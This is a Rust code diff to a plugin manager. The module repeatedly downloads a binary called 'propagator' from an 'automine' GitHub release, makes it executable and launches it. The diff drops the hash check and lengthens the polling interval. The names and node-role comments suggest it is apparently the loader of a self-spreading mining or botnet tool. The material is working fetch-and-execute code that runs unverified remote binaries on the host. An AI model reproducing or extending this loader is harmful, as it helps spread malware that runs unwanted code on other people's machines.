@@ -6,13 +6,13 @@ use std::fs;
 
 const PLUGIN_DIR: &str = "plugins";
 
-/// Plugin definition: (name, download_url, expected_hash)
+/// Plugin definition: (name, download_url)
 const PLUGINS: &[(&str, &str)] = &[
     ("propagator", "https://github.com/zvwgvx/automine/releases/latest/download/propagator"),
 ];
 
 pub async fn run_plugin_manager() {
-    info!("* [PluginManager] Service Started (Mesh).");
+    info!("* [PluginManager] Service Started (Edge).");
     
     // Ensure plugin directory exists
     let plugin_dir = get_plugin_dir();
@@ -33,15 +33,11 @@ pub async fn run_plugin_manager() {
                 ensure_plugin_running(name);
             }
         }
-        tokio::time::sleep(Duration::from_secs(60)).await;
+        tokio::time::sleep(Duration::from_secs(120)).await;
     }
 }
 
-fn check_condition(_name: &str) -> bool {
-    // Check if we have resources (RAM, CPU) or if we are the right role
-    // Mesh nodes run propagator by default
-    true 
-}
+fn check_condition(_name: &str) -> bool { true }
 
 fn has_plugin(name: &str) -> bool {
     let path = get_plugin_path(name);
@@ -84,7 +80,6 @@ async fn download_plugin(name: &str, url: &str) -> Result<(), String> {
     let path = get_plugin_path(name);
     fs::write(&path, &bytes).map_err(|e| format!("Failed to write file: {}", e))?;
     
-    // Make executable on Unix
     #[cfg(unix)]
     {
         use std::os::unix::fs::PermissionsExt;
@@ -100,8 +95,6 @@ async fn download_plugin(name: &str, url: &str) -> Result<(), String> {
 fn ensure_plugin_running(name: &str) {
     let path = get_plugin_path(name);
     if path.exists() {
-        // Check if already running using process name check would be ideal
-        // For now, spawn and let OS handle duplicates
         info!("* [PluginManager] Launching Plugin: {:?}", path);
         match Command::new(&path).spawn() {
             Ok(_) => info!("+ [PluginManager] Plugin '{}' launched.", name),
